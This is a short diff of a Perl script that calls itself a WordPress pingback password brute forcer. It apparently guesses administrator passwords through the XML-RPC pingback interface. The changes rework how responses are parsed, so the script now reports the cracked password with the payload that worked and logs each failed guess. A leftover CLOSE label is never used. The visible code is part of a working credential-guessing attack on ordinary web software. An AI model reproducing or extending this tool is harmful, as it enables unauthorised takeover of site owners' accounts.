@@ -1,6 +1,6 @@
 #!/usr/bin/perl -wU
 
-# WP PingBack password Brute Forcer (DIIIIRTY ! )
+# WP PingBack/apmification attack password Brute Forcer (DIIIIRTY ! )
 
 use 5.010;
 use IO::File;
@@ -56,29 +56,31 @@ while (my $Reading = $Handle->getline()) {
 			say "Parsing output to find RPC Pingback response...";
 			
 			foreach my$Output(@Tab){
-				
-				if(($Output=~/403/) and not ($Output =~/isadmin/i)){
-				
-					print (colored"\n  [+] ",'bold yellow');
-					say "Authentication failed; trying next password\n";
-					
-					foreach my $lol(@BF){
-	
-						my $output = new IO::File(">test.txt");
-						print $output  $lol;
-						 $output->close;
-					}
-					last;
-				}elsif ($Output=~/isadmin/i){
-					say colored"[*] Password found using this payload: $Output !",'bold green';
+
+				if ($Output=~/isadmin/i){
+					say colored"[*] Password $pass found using this payload: $Output !",'bold green';
+					unlink("test.txt");
 					exit;
 				}
+				else{
+				print (colored"\n  [+] ",'bold yellow');
+				say "Authentication failed ($pass); trying next password\n";
+				
+				foreach my $lol(@BF){
+	
+					my $output = new IO::File(">test.txt");
+					print $output  $lol;
+					$output->close;
+					}
+				}	
+
 			}
 		}
 }
 
 unlink("test.txt");
 
+CLOSE:
 print (colored"\n  [?] ",'bold blue');
 say "[-] Hope that you find something...";
 
